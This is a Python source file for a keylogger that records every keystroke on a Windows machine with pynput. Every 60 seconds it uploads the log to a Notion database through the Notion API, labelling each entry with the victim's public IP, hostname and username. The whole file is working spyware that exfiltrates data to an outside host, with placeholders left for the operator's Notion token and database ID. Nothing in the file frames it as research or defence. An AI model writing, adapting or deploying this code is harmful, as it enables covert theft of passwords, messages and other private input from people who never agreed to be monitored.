import os
import re
from threading import Timer

import requests
from pynput import keyboard


SECRET_TOKEN = "<YOUR INTEGRATION SECRET TOKEN HERE>"
DATABASE_ID = "<YOUR DATABASE ID OR URL HERE>"


class Notion_Database:
    def __init__(self, secret_token, database_id) -> None:
        # Get database ID in case someone pastes complete URL
        database_id = re.search(r"\b[a-fA-F0-9]{32}\b", database_id).string
        self.id = database_id
        self.headers = {
            "Authorization": f"Bearer {secret_token}",
            "Content-Type": "application/json",
            "Notion-Version": "2021-08-16"
        }

    def __prop_text(self, property_name: str, property_type: str, text_content: str) -> dict:
        r"""Return a template for any database property containing text. Returns empty dictionary for empty text_content."""
        if text_content is None or text_content == '':
            return dict()
        else:
            return {
                property_name: {
                    "type": property_type,
                    property_type: [self.obj_text(text_content)]
                }
            }

    def prop_date(self, property_name, start_date: str, end_date: str = None) -> dict:
        r"""
        Return a date property for databases. Dates must be written in ISO 8601 format.
        
        ISO 8601 format: https://docs.python.org/3/library/datetime.html#datetime.date.isoformat
        """
        return {
            property_name: {
                "type": "date",
                "date": {
                    "start": start_date,
                    "end": end_date
                }
            }
        }
    
    def prop_title(self, property_name, text_content) -> dict:
        r"""
        Return a title property for databases. Returns empty dictionary for empty text_content.
        
        Documentation: https://developers.notion.com/reference/property-object#title
        """
        return self.__prop_text(property_name, 'title', text_content)

    def prop_text(self, property_name, text_content) -> dict:
        r"""
        Return a rich_text property for databases. Returns empty dictionary for empty text_content.
        
        Documentation:
        - https://developers.notion.com/reference/property-object#rich-text
        - https://developers.notion.com/reference/rich-text
        """
        return self.__prop_text(property_name, 'rich_text', text_content)

    def obj_text(self, text_content: str) -> dict:
        r"""
        Return a rich_text object containing a no formatted text.
        
        Documentation: https://developers.notion.com/reference/rich-text
        """
        return {
            "type": "text",
            "text": {"content": text_content},
            "annotations": {
                "bold": False,
                "italic": False,
                "strikethrough": False,
                "underline": False,
                "code": False,
                "color": "default"
            },
            "plain_text": text_content
        }

    def write_paragraph(self, text_content: str, page_properties: dict = {}):
        r"""
        Write a paragraph in a page and add it to the database.
        
        :param text_content: data inside the paragraph block.
        :param properties: dictionary containing the page's database properties. (https://developers.notion.com/reference/property-object)
        """
        data = {
            "parent": {"database_id": self.id},
            "properties": page_properties,
            "children": [{
                "type": "paragraph",
                "paragraph": {
                    "rich_text": [self.obj_text(text_content)]
                }
            }]
        }

        return requests.post("https://api.notion.com/v1/pages", json=data, headers=self.headers)


class Notion_Klog:
    def __init__(self, secret_token: str, database_id: str, report_every: int = 60) -> None:
        self.db = Notion_Database(secret_token, database_id)
        self.report_every = report_every
        self.log = ''
        self.last_log = ''
        
        # Values for the database properties
        self.public_ip = self.get_public_ip()
        self.hostname = os.environ.get("COMPUTERNAME")
        self.username = os.environ.get("USERNAME")

    def __setup_db_props(self):
        r"""Return a dictionary containing the database properties."""
        
        if self.public_ip is None:
            self.public_ip = self.get_public_ip(self.public_ip)

        if self.hostname is None:
            self.hostname = os.environ.get("COMPUTERNAME")
        
        if self.username is None:
            self.username = os.environ.get("USERNAME")

        public_ip = self.db.prop_title("Public IP", self.public_ip)
        hostname = self.db.prop_text("Hostname", self.hostname)
        username = self.db.prop_text("Username", self.username)
        
        return public_ip | hostname | username

    def get_public_ip(self):
        req = requests.get("https://api.ipify.org?format=json", timeout = self.report_every // 2)
        
        if req.status_code == 200:
            return req.json()["ip"]
        else:
            return None

    def __on_press(self, key):
        r"""Append key to log."""
        try:
            key = str(key.char)
        except AttributeError:
            # Just append useful keys. Avoid modifiers.
            # https://pynput.readthedocs.io/en/latest/keyboard.html#pynput.keyboard.Key
            if key == key.space:
                key = ' '
            elif key == key.enter:
                key = '\n'
            elif key == key.backspace or key == key.caps_lock or key == key.down or key == key.left or key == key.print_screen or key == key.right or key == key.tab or key == key.up:
                key = '<' + str(key).upper().removeprefix('KEY.') + '>'
            else:
                key = ''
        finally:
            if key != 'None':
                print(key)
                self.log += key

    def __report(self):
        r"""Upload log to Notion every `self.report_every` seconds."""
        # Write self.log on a page.
        if self.log != '' and self.log != self.last_log:
            self.last_log = self.log
            page_properties = self.__setup_db_props()
            self.db.write_paragraph(self.log, page_properties)
        
        # Re-call this function in self.report_every seconds.
        Timer(self.report_every, self.__report).start()

    def run(self):
        with keyboard.Listener(self.__on_press) as listener:
            self.__report()
            listener.join()


if __name__ == '__main__':
    Notion_Klog(SECRET_TOKEN, DATABASE_ID, 60).run()
